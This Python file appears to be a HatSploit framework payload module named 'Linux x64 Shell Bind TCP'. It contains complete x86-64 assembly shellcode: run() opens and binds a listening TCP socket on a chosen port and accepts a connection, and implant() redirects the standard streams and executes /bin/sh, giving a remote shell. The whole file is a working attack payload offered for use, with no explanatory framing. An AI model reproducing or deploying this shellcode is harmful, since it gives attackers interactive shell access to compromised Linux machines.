"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *
from hatsploit.lib.core.payload.linux import Linux


class HatSploitPayload(Payload, Handler, Linux):
    def __init__(self):
        super().__init__({
            'Name': "Linux x64 Shell Bind TCP",
            'Payload': "linux/x64/shell_bind_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': (
                "This payload creates an interactive bind TCP shell for Linux "
                "with x64 architecture."
            ),
            'Arch': ARCH_X64,
            'Platform': OS_LINUX,
            'Type': BIND_TCP,
        })

    def implant(self):
        return self.assemble(
            """
            start:
                push 0x3
                pop rsi

            dup:
                dec rsi
                push 0x21
                pop rax
                syscall

                jne dup
                push 0x3b
                pop rax
                cdq
                movabs rbx, 0x68732f6e69622f
                push rbx
                mov rdi, rsp
                push rdx
                push rdi
                mov rsi, rsp
                syscall
            """
        )

    def run(self):
        return self.assemble(
            f"""
            start:
                push 0x29
                pop rax
                push 0x2
                pop rdi
                push 0x1
                pop rsi
                syscall

                xchg rdi, rax
                push rdx
                mov dword ptr [rsp], 0x{self.rport.little.hex()}0002
                mov rsi, rsp
                push 0x10
                pop rdx
                push 0x31
                pop rax
                syscall

                push 0x32
                pop rax
                syscall

                xor rsi, rsi
                push 0x2b
                pop rax
                syscall

                xchg rdi, rax
            """
        ) + self.implant()
